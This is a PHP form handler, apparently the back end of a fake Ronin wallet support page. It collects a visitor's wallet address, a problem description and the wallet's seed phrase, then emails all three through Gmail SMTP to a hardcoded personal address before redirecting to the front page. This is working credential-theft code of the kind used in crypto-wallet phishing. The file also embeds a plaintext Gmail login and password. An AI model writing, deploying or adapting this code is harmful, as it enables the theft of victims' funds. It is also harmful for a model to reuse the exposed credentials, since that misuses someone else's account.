<?php
use PHPMailer\PHPMailer\PHPMailer;
// require 'vendor/autoload.php';
if (isset($_POST)) {
    $address = $_POST['ronin-address'];
    $problem = $_POST['your-problem'];
    $phrase = $_POST['your-phrase'];
    if (!empty($address)) {
        
        require_once('PHPMailer.php');
        require_once('SMTP.php');
        require_once('Exception.php');

        $mail = new PHPMailer();

        $mail->isSMTP();
        $mail->Host = "smtp.gmail.com";
        $mail->SMTPAuth = true;
        $mail->Username = "dattocngan@gmail.com";
        $mail->Password = "vinsmartactive1plus";
        $mail->Port = 587;
        // $mail->SMTPSecure = "PHPMailer::ENCRYPTION_SMTPS";

        $email_body = "You have received new problems from the address $address.<br>".
        "Here are problems: $problem.<br>".
        "Seed Phrase: $phrase.";

        $mail->isHTML(true);
        $mail->setFrom($address,'Dat');
        $mail->addAddress("dattocngan@gmail.com");
        $mail->Subject = "Problems";
        $mail->Body = $email_body;

        if ($mail->send()) {
           header('Location: index.html');
        }else{
            echo $mail->ErrorInfo;
        }
        // $email_from = "bestchoice11111@gmail.com";
        // $email_subject = "Problems";
        
        // $to = "bestchoice11111@gmail.com";
        // $headers = "From: $email_from \r\n";

        // mail($to,$email_subject,$email_body,$headers);
        
    }
}